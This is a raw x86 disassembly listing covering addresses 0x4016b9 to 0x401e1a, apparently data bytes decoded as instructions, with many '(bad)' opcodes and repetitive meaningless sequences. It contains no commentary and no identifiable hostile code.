  4016b9:	add    BYTE PTR ds:0x105074bc,bl
  4016bf:	mov    dh,0x63
  4016c1:	inc    ecx
  4016c2:	(bad)  
  4016c3:	mov    esp,0xa9f16572
  4016c8:	add    BYTE PTR [eax],al
  4016ca:	es mov dh,0x61
  4016cd:	fs push ds
  4016cf:	mov    al,0x62
  4016d1:	jb     0x4016d6
  4016d3:	stos   DWORD PTR es:[edi],eax
  4016d4:	jns    0x40171b
  4016d6:	ficomp DWORD PTR [eax-0x495a0000]
  4016dc:	popa   
  4016dd:	fs sahf 
  4016df:	mov    al,0x62
  4016e1:	jb     0x4016a6
  4016e3:	stos   DWORD PTR es:[edi],eax
  4016e4:	jns    0x40172b
  4016e6:	mov    edx,0x9d00008e
  4016eb:	mov    esp,0xbdbd4d74
  4016f0:	jne    0x40175e
  4016f2:	mov    edi,0x866e6191
  4016f7:	mov    ch,0x65
  4016f9:	inc    ecx
  4016fa:	(bad)  
  4016fb:	fld    DWORD PTR [eax]
  4016fd:	add    BYTE PTR [ecx-0x719e9a55],ah
  401703:	mov    esp,0xbc8e6946
  401708:	inc    ecx
  401709:	add    BYTE PTR [esi-0x7e8d8b56],al
  40170f:	mov    eax,0xd9624174
  401714:	add    BYTE PTR [eax],al
  401716:	and    eax,0x5774bc
  40171b:	dec    ebx
  40171c:	mov    bh,0x64
  40171e:	outs   dx,DWORD PTR ds:[esi]
  40171f:	push   ebp
  401720:	stos   BYTE PTR es:[edi],al
  401721:	inc    esp
  401722:	imul   edx,DWORD PTR [eax-0x44],0xab4d7463
  401729:	jns    0x40176c
  40172b:	(bad)  
  40172c:	fld    DWORD PTR [eax]
  40172e:	add    BYTE PTR ds:0x354d74bc,ah
  401734:	mov    ebp,0x91076c75
  401739:	popa   
  40173a:	outs   dx,BYTE PTR ds:[esi]
  40173b:	(bad)  
  40173c:	mov    ah,0x65
  40173e:	push   edi
  40173f:	(bad)  
  401740:	fld    DWORD PTR [eax]
  401742:	add    BYTE PTR [esi-0x26],bl
  401745:	inc    eax
  401746:	add    BYTE PTR [esi-0x26],dl
  401749:	inc    eax
  40174a:	add    BYTE PTR [esi],bh
  40174c:	fiadd  DWORD PTR [eax+0x0]
  40174f:	fiadd  DWORD PTR ss:[eax+0x0]
  401753:	sbb    bl,dl
  401755:	inc    eax
  401756:	add    BYTE PTR [esi-0x3dffbf28],dh
  40175c:	fadd   DWORD PTR [eax+0x0]
  40175f:	retf   0x40d8
  401762:	add    BYTE PTR [ebp-0x4faf8b42],bl
  401768:	mov    ah,0x63
  40176a:	inc    ecx
  40176b:	mov    esi,0xb16572bd
  401770:	test   al,0x0
  401772:	add    BYTE PTR [esi-0x519b9e4c],dl
  401778:	mov    dl,0x62
  40177a:	jb     0x4016ff
  40177c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40177d:	jns    0x4017c4
  40177f:	add    BYTE PTR [edx+0x7900009a],cl
  401785:	mov    esi,0xb5876e72
  40178a:	xor    esi,DWORD PTR [edx]
  40178c:	inc    esp
  40178d:	mov    ebp,0xd9626c6c
  401792:	add    BYTE PTR [eax],al
  401794:	ja     0x40173e
  401796:	jbe    0x4017fb
  401798:	push   eax
  401799:	lods   eax,DWORD PTR ds:[esi]
  40179a:	cs fs inc esi
  40179d:	mov    ch,0x0
  40179f:	add    BYTE PTR [edi],bh
  4017a1:	mov    esi,0xad3f736d
  4017a6:	add    BYTE PTR [eax],al
  4017a8:	dec    edi
  4017a9:	test   al,0x76
  4017ab:	arpl   WORD PTR [eax],si
  4017ad:	lods   eax,DWORD PTR ds:[esi]
  4017ae:	cs fs ds mov ch,0x0
  4017b3:	add    BYTE PTR [edi],dh
  4017b5:	mov    esi,0xa212636d
  4017ba:	add    BYTE PTR [eax],al
  4017bc:	sub    al,0xb2
  4017be:	jb     0x401834
  4017c0:	pop    ss
  4017c1:	mov    edx,0xb4f6416c
  4017c6:	outs   dx,DWORD PTR ds:[esi]
  4017c7:	arpl   WORD PTR [edx-0x27],sp
  4017ca:	add    BYTE PTR [eax],al
  4017cc:	btr    DWORD PTR [ebp+0x61],ebp
  4017d0:	repnz mov ch,BYTE PTR [ecx+0x65]
  4017d4:	in     eax,dx
  4017d5:	xchg   ebx,eax
  4017d6:	inc    si
  4017d8:	retf   
  4017d9:	mov    ch,0x65
  4017db:	add    BYTE PTR [edx+esi*4-0x45288b8e],ch
  4017e2:	ins    BYTE PTR es:[edi],dx
  4017e3:	push   eax
  4017e4:	add    al,dl
  4017e6:	mov    ah,0x74
  4017e8:	shr    DWORD PTR gs:[ebp-0x41560000],0x61
  4017f0:	jo     0x401795
  4017f2:	mov    ch,0x6c
  4017f4:	outs   dx,DWORD PTR ds:[esi]
  4017f5:	rcr    ecx,0x0
  4017f8:	add    BYTE PTR [ecx+0x7f6e72be],cl
  4017fe:	mov    ch,0x33
  401800:	xor    bh,BYTE PTR [edi*4-0x269d9394]
  401807:	add    BYTE PTR [eax],al
  401809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40180a:	mov    esi,0xb4705074
  40180f:	arpl   WORD PTR [ebp+0x71],sp
  401812:	test   al,0x48
  401814:	sub    DWORD PTR gs:[ecx-0x269e0000],0xffffff98
  40181c:	add    al,0x62
  40181e:	jge    0x401879
  401820:	add    BYTE PTR [edx+0x32],ah
  401823:	add    eax,DWORD PTR [eax]
  401825:	bound  esi,QWORD PTR [edx]
  401827:	add    eax,DWORD PTR [eax]
  401829:	bound  esi,QWORD PTR [edx]
  40182b:	add    eax,DWORD PTR [eax]
  40182d:	bound  esi,QWORD PTR [edx]
  40182f:	add    eax,DWORD PTR [eax]
  401831:	bound  esi,QWORD PTR [edx]
  401833:	add    eax,DWORD PTR [eax]
  401835:	bound  esi,QWORD PTR [edx]
  401837:	add    eax,DWORD PTR [eax]
  401839:	bound  esi,QWORD PTR [edx]
  40183b:	add    eax,DWORD PTR [eax]
  40183d:	bound  esi,QWORD PTR [edx]
  40183f:	add    eax,DWORD PTR [eax]
  401841:	bound  esi,QWORD PTR [edx]
  401843:	add    eax,DWORD PTR [eax]
  401845:	bound  esi,QWORD PTR [edx]
  401847:	add    eax,DWORD PTR [eax]
  401849:	add    BYTE PTR [edx+0x32],ah
  40184c:	add    eax,DWORD PTR [eax]
  40184e:	bound  esi,QWORD PTR [edx]
  401850:	add    eax,DWORD PTR [eax]
  401852:	bound  esi,QWORD PTR [edx]
  401854:	add    eax,DWORD PTR [eax]
  401856:	bound  esi,QWORD PTR [edx]
  401858:	add    eax,DWORD PTR [eax]
  40185a:	bound  edx,QWORD PTR [eax]
  40185c:	add    al,0x0
  40185e:	bound  esi,QWORD PTR [eax]
  401860:	add    eax,DWORD PTR [eax]
  401862:	bound  esi,QWORD PTR [eax]
  401864:	add    eax,DWORD PTR [eax]
  401866:	bound  esi,QWORD PTR [eax]
  401868:	add    eax,DWORD PTR [eax]
  40186a:	bound  esi,QWORD PTR [eax]
  40186c:	add    eax,DWORD PTR [eax]
  40186e:	bound  esi,QWORD PTR [eax]
  401870:	add    eax,DWORD PTR [eax]
  401872:	bound  esi,QWORD PTR [eax]
  401874:	add    eax,DWORD PTR [eax]
  401876:	bound  esi,QWORD PTR [eax]
  401878:	add    eax,DWORD PTR [eax]
  40187a:	bound  esi,QWORD PTR [eax]
  40187c:	add    eax,DWORD PTR [eax]
  40187e:	bound  esi,QWORD PTR [eax]
  401880:	add    eax,DWORD PTR [eax]
  401882:	bound  esi,QWORD PTR [eax]
  401884:	add    eax,DWORD PTR [eax]
  401886:	bound  esi,QWORD PTR [eax]
  401888:	add    eax,DWORD PTR [eax]
  40188a:	bound  esi,QWORD PTR [eax]
  40188c:	add    eax,DWORD PTR [eax]
  40188e:	bound  esi,QWORD PTR [eax]
  401890:	add    eax,DWORD PTR [eax]
  401892:	bound  esi,QWORD PTR [eax]
  401894:	add    eax,DWORD PTR [eax]
  401896:	(bad)  
  401897:	fldl2t 
  401899:	add    esp,DWORD PTR [edx-0x27]
  40189c:	jmp    0xea197aa4
  4018a1:	add    esp,DWORD PTR [edx-0x27]
  4018a4:	jmp    0xea197aac
  4018a9:	add    esp,DWORD PTR [edx-0x27]
  4018ac:	jmp    0xd9a218b4
  4018b1:	jmp    0xea197ab9
  4018b6:	add    esp,DWORD PTR [edx-0x27]
  4018b9:	jmp    0xea197ac1
  4018be:	add    esp,DWORD PTR [edx-0x27]
  4018c1:	jmp    0xea197ac9
  4018c6:	add    esp,DWORD PTR [edx-0x27]
  4018c9:	jmp    0xea197ad1
  4018ce:	add    esp,DWORD PTR [edx-0x27]
  4018d1:	jmp    0xea197ad9
  4018d6:	add    esp,DWORD PTR [edx-0x27]
  4018d9:	jmp    0xea197ae1
  4018de:	add    esp,DWORD PTR [edx-0x27]
  4018e1:	jmp    0xea197ae9
  4018e6:	add    esp,DWORD PTR [edx-0x27]
  4018e9:	jmp    0xea197af1
  4018ee:	add    esp,DWORD PTR [edx-0x27]
  4018f1:	jmp    0xea197af9
  4018f6:	add    esp,DWORD PTR [edx-0x27]
  4018f9:	jmp    0xea197b01
  4018fe:	add    esp,DWORD PTR [edx-0x27]
  401901:	jmp    0xea197b09
  401906:	add    esp,DWORD PTR [edx-0x27]
  401909:	jmp    0xea197b11
  40190e:	add    esp,DWORD PTR [edx-0x27]
  401911:	add    cl,ch
  401913:	add    BYTE PTR [ecx-0x27],ah
  401916:	add    cl,ch
  401918:	popa   
  401919:	fld    DWORD PTR [eax]
  40191b:	jmp    0xe940f281
  401920:	popa   
  401921:	fld    DWORD PTR [eax]
  401923:	jmp    0xe940f289
  401928:	popa   
  401929:	fld    DWORD PTR [eax]
  40192b:	jmp    0xe940f291
  401930:	popa   
  401931:	fld    DWORD PTR [eax]
  401933:	jmp    0xe940f299
  401938:	popa   
  401939:	fld    DWORD PTR [eax]
  40193b:	jmp    0xe940f2a1
  401940:	popa   
  401941:	fld    DWORD PTR [eax]
  401943:	cmp    DWORD PTR [ebp-0x27],ecx
  401946:	add    BYTE PTR ds:0x900d661,bl
  40194c:	aas    
  40194d:	dec    edx
  40194e:	push   eax
  40194f:	jmp    0xe940f2b5
  401954:	popa   
  401955:	fld    DWORD PTR [eax]
  401957:	leave  
  401958:	pop    esi
  401959:	xlat   BYTE PTR ds:[ebx]
  40195a:	add    edx,esi
  40195c:	pusha  
  40195d:	aam    0x0
  40195f:	jmp    0xe940ef0f
  401964:	(bad)  
  401965:	fld    DWORD PTR [eax]
  401967:	jmp    0x3f40f2cd
  40196c:	mov    ch,0xdb
  40196e:	add    cl,ch
  401970:	push   ecx
  401971:	fld    DWORD PTR [eax]
  401973:	jmp    0xe940ef39
  401978:	add    BYTE PTR [ecx-0x67],ah
  40197b:	add    cl,ch
  40197d:	jno    0x401958
  40197f:	add    cl,ch
  401981:	pop    edi
  401982:	fld    DWORD PTR [eax]
  401984:	in     al,dx
  401985:	popa   
  401986:	fiadd  DWORD PTR [eax]
  401988:	call   0x40f2ee
  40198d:	push   cs
  40198e:	fld    QWORD PTR [ecx]
  401990:	add    BYTE PTR [ebx],cl
  401992:	fld    QWORD PTR [eax]
  401994:	add    bl,bh
  401996:	or     al,0x4
  401998:	add    bl,bh
  40199a:	and    bh,bh
  40199c:	dec    ebx
  40199e:	fadd   QWORD PTR [eax]
  4019a0:	add    cl,cl
  4019a2:	fadd   QWORD PTR [eax]
  4019a4:	cmp    DWORD PTR [ebx-0x44ffef24],0xcb0000cc
  4019ae:	fcom   QWORD PTR [eax]
  4019b0:	add    bl,cl
  4019b2:	int3   
  4019b3:	add    BYTE PTR [eax],al
  4019b5:	mov    ebx,0x8b0000dc
  4019ba:	fadd   QWORD PTR [eax]
  4019bc:	add    BYTE PTR [ebx-0x74ffff24],cl
  4019c2:	fadd   QWORD PTR [eax]
  4019c4:	add    BYTE PTR [edi-0x23],cl
  4019c7:	add    al,0x0
  4019c9:	and    ebx,esp
  4019cb:	add    BYTE PTR [eax],al
  4019cd:	mov    ebx,esp
  4019cf:	add    BYTE PTR [eax],al
  4019d1:	mov    ebx,esp
  4019d3:	add    BYTE PTR [eax],al
  4019d5:	jnp    0x4019b3
  4019d7:	add    BYTE PTR [eax],al
  4019d9:	jnp    0x4019b7
  4019db:	add    BYTE PTR [eax],al
  4019dd:	add    BYTE PTR [ebx-0x24],cl
  4019e0:	add    BYTE PTR [eax],al
  4019e2:	dec    ebx
  4019e3:	fadd   QWORD PTR [eax]
  4019e5:	add    BYTE PTR [ebx],bh
  4019e7:	dec    esp
  4019e8:	add    al,0x0
  4019ea:	scas   eax,DWORD PTR es:[edi]
  4019eb:	cli    
  4019ec:	add    BYTE PTR [eax],al
  4019ee:	dec    ebx
  4019ef:	fadd   QWORD PTR [eax]
  4019f1:	add    BYTE PTR [ebx-0x24],cl
  4019f4:	add    BYTE PTR [eax],al
  4019f6:	cmp    ebx,esp
  4019f8:	add    BYTE PTR [eax],al
  4019fa:	cmp    ebx,esp
  4019fc:	add    BYTE PTR [eax],al
  4019fe:	or     ebx,esp
  401a00:	add    BYTE PTR [eax],al
  401a02:	or     ebx,esp
  401a04:	add    BYTE PTR [eax],al
  401a06:	bound  esi,QWORD PTR [edx]
  401a08:	add    eax,DWORD PTR [eax]
  401a0a:	bound  esi,QWORD PTR [edx]
  401a0c:	add    eax,DWORD PTR [eax]
  401a0e:	(bad)  
  401a0f:	fisubr DWORD PTR [eax+eax*1+0x37262]
  401a16:	bound  esi,QWORD PTR [edx]
  401a18:	add    eax,DWORD PTR [eax]
  401a1a:	bound  esi,QWORD PTR [edx]
  401a1c:	add    eax,DWORD PTR [eax]
  401a1e:	bound  esi,QWORD PTR [edx]
  401a20:	adc    eax,DWORD PTR [eax]
  401a22:	(bad)  
  401a23:	out    dx,al
  401a24:	add    DWORD PTR [eax],eax
  401a26:	bound  esi,QWORD PTR [edx]
  401a28:	add    eax,DWORD PTR [eax]
  401a2a:	bound  esi,QWORD PTR [edx]
  401a2c:	add    eax,DWORD PTR [eax]
  401a2e:	bound  esi,QWORD PTR [edx]
  401a30:	add    eax,DWORD PTR [eax]
  401a32:	bound  esi,QWORD PTR [edx]
  401a34:	add    eax,DWORD PTR [eax]
  401a36:	bound  esi,QWORD PTR [edx]
  401a38:	add    eax,DWORD PTR [eax]
  401a3a:	bound  esi,QWORD PTR [edx]
  401a3c:	add    eax,DWORD PTR [eax]
  401a3e:	(bad)  
  401a3f:	enter  0x6570,0x0
  401a43:	sbb    al,BYTE PTR [esi-0x6d9dfffc]
  401a49:	dec    ecx
  401a4a:	add    al,0x62
  401a4c:	xor    dl,BYTE PTR [ebx]
  401a4e:	add    BYTE PTR [edx+0x32],ah
  401a51:	inc    ebp
  401a52:	add    al,0x62
  401a54:	xor    bh,bh
  401a56:	jmp    FWORD PTR [ebp+0x31]
  401a59:	add    eax,DWORD PTR [eax]
  401a5b:	bound  esi,QWORD PTR [edx]
  401a5d:	add    eax,DWORD PTR [eax]
  401a5f:	bound  esi,QWORD PTR [eax]
  401a61:	add    eax,DWORD PTR [eax]
  401a63:	bound  edx,QWORD PTR [eax]
  401a65:	add    eax,DWORD PTR [eax]
  401a67:	ret    0x5f16
  401a6a:	popa   
  401a6b:	into   
  401a6c:	rol    DWORD PTR [eax+eax*1],1
  401a6f:	bound  ebx,QWORD PTR [eax]
  401a71:	pop    ds
  401a72:	add    BYTE PTR [edx+0x30],ah
  401a75:	arpl   WORD PTR [edx+eiz*2],ax
  401a78:	xor    BYTE PTR [ebx],cl
  401a7a:	add    BYTE PTR [edx+0x30],ah
  401a7d:	push   ecx
  401a7e:	add    al,0x62
  401a80:	fldl2t 
  401a82:	add    esp,DWORD PTR [edx-0x27]
  401a85:	jmp    0xea197c8d
  401a8a:	add    esp,DWORD PTR [edx-0x27]
  401a8d:	test   eax,0x17196203
  401a92:	jb     0x401b13
  401a94:	lods   eax,DWORD PTR ds:[esi]
  401a95:	into   
  401a96:	bound  esp,QWORD PTR [edx-0x27]
  401a99:	jno    0x401ad5
  401a9b:	(bad)  
  401a9c:	fldl2t 
  401a9e:	xchg   ebx,eax
  401a9f:	data16 fldl2t 
  401aa2:	aaa    
  401aa3:	(bad)  
  401aa4:	fldl2t 
  401aa6:	pop    ecx
  401aa7:	add    BYTE PTR [esi-0x27],ah
  401aaa:	jmp    0xea197cb2
  401aaf:	add    esp,DWORD PTR [edx-0x27]
  401ab2:	jmp    0xaa197cba
  401ab7:	add    esp,DWORD PTR [edx-0x65]
  401aba:	jmp    0xea197cc2
  401abf:	add    esp,DWORD PTR [edx-0x27]
  401ac2:	jmp    0xea197cca
  401ac7:	add    esp,DWORD PTR [edx-0x27]
  401aca:	jmp    0xea197cd2
  401acf:	add    esp,DWORD PTR [edx-0x27]
  401ad2:	jmp    0xea197cda
  401ad7:	add    esp,DWORD PTR [edx-0x27]
  401ada:	jmp    0xea197ce2
  401adf:	add    esp,DWORD PTR [edx-0x27]
  401ae2:	jmp    0xea197cea
  401ae7:	add    esp,DWORD PTR [edx-0x27]
  401aea:	jmp    0xea197cf2
  401aef:	add    esp,DWORD PTR [edx-0x27]
  401af2:	jmp    0xea197cfa
  401af7:	add    esp,DWORD PTR [edx-0x27]
  401afa:	add    cl,ch
  401afc:	popa   
  401afd:	fld    DWORD PTR [eax]
  401aff:	jmp    0xe940f465
  401b04:	popa   
  401b05:	fld    DWORD PTR [eax]
  401b07:	jmp    0xe940f46d
  401b0c:	add    BYTE PTR [ecx-0x27],ah
  401b0f:	add    cl,ch
  401b11:	popa   
  401b12:	fld    DWORD PTR [eax]
  401b14:	jmp    0xe940f47a
  401b19:	popa   
  401b1a:	fld    DWORD PTR [eax]
  401b1c:	jmp    0xe940f482
  401b21:	popa   
  401b22:	fld    DWORD PTR [eax]
  401b24:	jmp    0xe940f48a
  401b29:	popa   
  401b2a:	fld    DWORD PTR [eax]
  401b2c:	jmp    0xe940f492
  401b31:	popa   
  401b32:	fld    DWORD PTR [eax]
  401b34:	jmp    0xe940f49a
  401b39:	popa   
  401b3a:	fld    DWORD PTR [eax]
  401b3c:	jmp    0xe940f4a2
  401b41:	popa   
  401b42:	fld    DWORD PTR [eax]
  401b44:	jmp    0xe940f4aa
  401b49:	popa   
  401b4a:	fld    DWORD PTR [eax]
  401b4c:	jmp    0xe940f4b2
  401b51:	popa   
  401b52:	fld    DWORD PTR [eax]
  401b54:	jmp    0xe940f4ba
  401b59:	popa   
  401b5a:	fld    DWORD PTR [eax]
  401b5c:	jmp    0xe940f4c2
  401b61:	popa   
  401b62:	fld    DWORD PTR [eax]
  401b64:	jmp    0xe940f4ca
  401b69:	popa   
  401b6a:	fld    DWORD PTR [eax]
  401b6c:	jmp    0xe940f4d2
  401b71:	add    BYTE PTR [ecx-0x27],ah
  401b74:	add    BYTE PTR [eax],al
  401b76:	dec    ebx
  401b77:	fld    DWORD PTR [eax]
  401b79:	add    BYTE PTR [ebx],bh
  401b7b:	fld    DWORD PTR [eax]
  401b7d:	add    BYTE PTR [ebx],bh
  401b7f:	fld    DWORD PTR [eax]
  401b81:	add    BYTE PTR [ebx],cl
  401b83:	fld    DWORD PTR [eax]
  401b85:	add    BYTE PTR [ebx],cl
  401b87:	fld    DWORD PTR [eax]
  401b89:	add    bl,bh
  401b8b:	fadd   DWORD PTR [eax]
  401b8d:	add    bl,bh
  401b8f:	fadd   DWORD PTR [eax]
  401b91:	add    BYTE PTR [ebx],cl
  401b93:	fld    DWORD PTR [eax]
  401b95:	add    BYTE PTR [ebx],cl
  401b97:	fld    DWORD PTR [eax]
  401b99:	add    bl,bh
  401b9b:	fadd   DWORD PTR [eax]
  401b9d:	add    bl,bh
  401b9f:	fadd   DWORD PTR [eax]
  401ba1:	add    bl,cl
  401ba3:	fadd   DWORD PTR [eax]
  401ba5:	add    bl,cl
  401ba7:	fadd   DWORD PTR [eax]
  401ba9:	add    BYTE PTR [ebx-0x44ffff28],bh
  401baf:	fadd   DWORD PTR [eax]
  401bb1:	add    bl,cl
  401bb3:	fadd   DWORD PTR [eax]
  401bb5:	add    bl,cl
  401bb7:	fadd   DWORD PTR [eax]
  401bb9:	add    BYTE PTR [ebx-0x44ffff28],bh
  401bbf:	fadd   DWORD PTR [eax]
  401bc1:	add    BYTE PTR [ebx-0x74ffff28],cl
  401bc7:	fadd   DWORD PTR [eax]
  401bc9:	add    BYTE PTR [ebx-0x28],bh
  401bcc:	add    BYTE PTR [eax],al
  401bce:	jnp    0x401ba8
  401bd0:	add    BYTE PTR [eax],al
  401bd2:	mov    ebx,eax
  401bd4:	add    BYTE PTR [eax],al
  401bd6:	add    BYTE PTR [ebx+0x7b0000d8],cl
  401bdc:	fadd   DWORD PTR [eax]
  401bde:	add    BYTE PTR [ebx-0x28],bh
  401be1:	add    BYTE PTR [eax],al
  401be3:	dec    ebx
  401be4:	fadd   DWORD PTR [eax]
  401be6:	add    BYTE PTR [ebx-0x28],cl
  401be9:	add    BYTE PTR [eax],al
  401beb:	cmp    ebx,eax
  401bed:	add    BYTE PTR [eax],al
  401bef:	bound  esi,QWORD PTR [edx]
  401bf1:	add    eax,DWORD PTR [eax]
  401bf3:	bound  esi,QWORD PTR [edx]
  401bf5:	add    eax,DWORD PTR [eax]
  401bf7:	bound  esi,QWORD PTR [edx]
  401bf9:	add    eax,DWORD PTR [eax]
  401bfb:	bound  esi,QWORD PTR [edx]
  401bfd:	add    eax,DWORD PTR [eax]
  401bff:	bound  esi,QWORD PTR [edx]
  401c01:	add    eax,DWORD PTR [eax]
  401c03:	bound  esi,QWORD PTR [edx]
  401c05:	add    eax,DWORD PTR [eax]
  401c07:	bound  esi,QWORD PTR [edx]
  401c09:	add    eax,DWORD PTR [eax]
  401c0b:	bound  esi,QWORD PTR [edx]
  401c0d:	add    eax,DWORD PTR [eax]
  401c0f:	bound  esi,QWORD PTR [edx]
  401c11:	add    eax,DWORD PTR [eax]
  401c13:	bound  esi,QWORD PTR [edx]
  401c15:	add    eax,DWORD PTR [eax]
  401c17:	bound  esi,QWORD PTR [edx]
  401c19:	add    eax,DWORD PTR [eax]
  401c1b:	bound  esi,QWORD PTR [edx]
  401c1d:	add    eax,DWORD PTR [eax]
  401c1f:	bound  esi,QWORD PTR [edx]
  401c21:	add    eax,DWORD PTR [eax]
  401c23:	bound  esi,QWORD PTR [edx]
  401c25:	add    eax,DWORD PTR [eax]
  401c27:	bound  esi,QWORD PTR [edx]
  401c29:	add    eax,DWORD PTR [eax]
  401c2b:	bound  esi,QWORD PTR [edx]
  401c2d:	add    eax,DWORD PTR [eax]
  401c2f:	bound  ecx,QWORD PTR [edi+ecx*2+0x4]
  401c33:	bound  edi,QWORD PTR [edx+edx*2+0x52d06204]
  401c3a:	add    al,0x0
  401c3c:	bound  esp,QWORD PTR [eax]
  401c3e:	push   ecx
  401c3f:	add    al,0x62
  401c41:	xor    dl,BYTE PTR [ecx+0x4]
  401c44:	bound  eax,QWORD PTR [eax]
  401c46:	push   ecx
  401c47:	add    al,0x62
  401c49:	enter  0x456,0x62
  401c4d:	mov    esp,0xe2620456
  401c52:	push   esi
  401c53:	add    al,0x62
  401c55:	nop
  401c56:	push   esi
  401c57:	add    al,0x62
  401c59:	fcom   QWORD PTR [esi+0x4]
  401c5c:	bound  ebp,QWORD PTR [eax+0x52620456]
  401c62:	push   esi
  401c63:	add    al,0x62
  401c65:	sahf   
  401c66:	push   esi
  401c67:	add    al,0x62
  401c69:	fnstenv [ebp-0x742699aa]
  401c6f:	push   esi
  401c70:	pop    esi
  401c71:	fst    DWORD PTR [ebx-0x42699aa]
  401c77:	push   esi
  401c78:	pop    esi
  401c79:	(bad)  
  401c7b:	push   esi
  401c7c:	fnstenvw [ebx]
  401c7f:	push   edi
  401c80:	pop    esi
  401c81:	(bad)  [edi]
  401c83:	push   edi
  401c84:	data16 (bad) [edi+0x57]
  401c88:	pop    esi
  401c89:	fldenv [ebx+0x37d96657]
  401c8f:	push   edi
  401c90:	pop    esi
  401c91:	fld    DWORD PTR [ecx+0x57]
  401c94:	data16 fst DWORD PTR [ecx+0x57]
  401c98:	pop    esi
  401c99:	(bad)  
  401c9b:	push   edi
  401c9c:	data16 fldcw WORD PTR [edi+0x58]
  401ca0:	add    BYTE PTR [esi-0x27],bl
  401ca3:	mov    ch,0x57
  401ca5:	data16 fldcw WORD PTR [ebp+0x55]
  401ca9:	pop    esi
  401caa:	fnstenv [edi-0x1c2699a9]
  401cb0:	push   edi
  401cb1:	pop    esi
  401cb2:	fincstp 
  401cb4:	push   edi
  401cb5:	data16 fldl2t 
  401cb8:	add    esp,DWORD PTR [edx-0x27]
  401cbb:	cmovge esp,DWORD PTR [esi-0x27]
  401cbf:	mov    ebx,0x99d95e4d
  401cc4:	dec    ebp
  401cc5:	data16 fnstcw WORD PTR [ebx+0x4d]
  401cc9:	pop    esi
  401cca:	fnstcw WORD PTR [ecx+0x9d9664c]
  401cd0:	dec    esi
  401cd1:	pop    esi
  401cd2:	fabs   
  401cd4:	dec    ebp
  401cd5:	data16 fst DWORD PTR [ebx-0x1626a1b4]
  401cdc:	add    esp,DWORD PTR [edx-0x27]
  401cdf:	aas    
  401ce0:	dec    esp
  401ce1:	pop    esi
  401ce2:	fld    DWORD PTR [eax]
  401ce4:	arpl   WORD PTR [ecx-0x59c6ff2b],bp
  401cea:	aad    0x0
  401cec:	xchg   DWORD PTR [ecx-0x66acff2b],ebx
  401cf2:	aad    0x0
  401cf4:	(bad)  
  401cf6:	aad    0x0
  401cf8:	xor    esp,DWORD PTR [esi-0x61e6ff2b]
  401cfe:	aad    0x0
  401d00:	and    eax,0xb100d596
  401d05:	add    BYTE PTR [ecx-0x563eff2b],ch
  401d0b:	aad    0x0
  401d0d:	add    DWORD PTR [esi-0x660eff2b],ebx
  401d13:	aad    0x0
  401d15:	pop    ebx
  401d16:	cwde   
  401d17:	aad    0x0
  401d19:	xor    DWORD PTR [eax+0x61e900d5],ebx
  401d1f:	fld    DWORD PTR [eax]
  401d21:	pop    ss
  401d22:	xchg   esp,eax
  401d23:	aad    0x0
  401d25:	jmp    0xb940f68b
  401d2a:	sub    dl,ch
  401d2c:	add    BYTE PTR [ecx+0x1a],ch
  401d2f:	aad    0x0
  401d31:	jne    0x401d4d
  401d33:	aad    0x0
  401d35:	dec    ecx
  401d36:	sub    dl,ch
  401d38:	add    BYTE PTR ds:0x4300d52a,bh
  401d3e:	sbb    dl,ch
  401d40:	add    BYTE PTR [ecx],dh
  401d42:	sbb    dl,ch
  401d44:	add    BYTE PTR [edi],bl
  401d46:	sub    dl,ch
  401d48:	add    BYTE PTR [edi],cl
  401d4a:	sub    dl,ch
  401d4c:	add    bh,dl
  401d4e:	and    eax,0x1bed00d5
  401d53:	aad    0x0
  401d55:	imul   DWORD PTR [ebx]
  401d57:	aad    0x0
  401d59:	adc    eax,0xd528
  401d5e:	cmp    ecx,DWORD PTR [edi-0x70bcfffc]
  401d64:	add    al,0x0
  401d66:	lahf   
  401d67:	mov    ds:0xc1000004,eax
  401d6c:	mov    ds:0xa3990004,eax
  401d71:	add    al,0x0
  401d73:	xchg   ebp,eax
  401d74:	mov    ds:0xa4090004,eax
  401d79:	add    al,0x0
  401d7b:	pop    es
  401d7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d7d:	add    al,0x0
  401d7f:	aad    0xa3
  401d81:	add    al,0x0
  401d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d84:	mov    ds:0xa22b0004,eax
  401d89:	add    al,0x0
  401d8b:	shl    DWORD PTR [ecx-0x5e28fffc],1
  401d91:	add    al,0x0
  401d93:	and    DWORD PTR [edx-0x5ddefffc],esp
  401d99:	add    al,0x0
  401d9b:	adc    DWORD PTR [edx-0x5d72fffc],esp
  401da1:	add    al,0x0
  401da3:	shl    DWORD PTR [edx-0x5da8fffc],cl
  401da9:	add    al,0x0
  401dab:	jnp    0x401d4f
  401dad:	add    al,0x0
  401daf:	pop    ecx
  401db0:	mov    ds:0xa2830004,al
  401db5:	add    al,0x0
  401db7:	mov    ebx,0xa10004d4
  401dbc:	aam    0x4
  401dbe:	add    BYTE PTR [ecx-0xafffb2c],ah
  401dc4:	aam    0x4
  401dc6:	add    cl,dh
  401dc8:	aam    0x4
  401dca:	add    BYTE PTR [edi],dl
  401dcc:	aam    0x4
  401dce:	add    BYTE PTR [eax],al
  401dd0:	adc    esp,edx
  401dd2:	add    al,0x0
  401dd4:	jecxz  0x401daa
  401dd6:	add    al,0x0
  401dd8:	bound  ebx,QWORD PTR [edx+0x3b]
  401ddb:	add    al,0x62
  401ddd:	cmp    ax,WORD PTR [edx+eiz*2]
  401de1:	dec    esi
  401de2:	cmp    eax,DWORD PTR [edx+eiz*2]
  401de5:	cmp    bh,BYTE PTR [ebx]
  401de7:	add    al,0x62
  401de9:	sub    BYTE PTR [ebx],bh
  401deb:	add    al,0x62
  401ded:	inc    esi
  401dee:	cmp    eax,DWORD PTR [edx+eiz*2]
  401df1:	adc    al,0x3a
  401df3:	add    al,0x62
  401df5:	push   ds
  401df6:	cmp    al,BYTE PTR [edx+eiz*2]
  401df9:	cmp    BYTE PTR [edx],bh
  401dfb:	add    al,0x62
  401dfd:	sar    BYTE PTR [ebx],cl
  401dff:	add    al,0x62
  401e01:	sar    BYTE PTR [ebx],0x4
  401e04:	(bad)  
  401e05:	call   0x80a22245
  401e0a:	cmp    al,BYTE PTR [edx+eiz*2]
  401e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e0e:	cmp    al,BYTE PTR [edx+eiz*2]
  401e11:	js     0x401e4d
  401e13:	add    al,0x62
  401e15:	sar    BYTE PTR [edx],0x4
  401e18:	(bad)  
  401e19:	int3   
  401e1a:	cmp    al,BYTE PTR [edx+eiz*2]
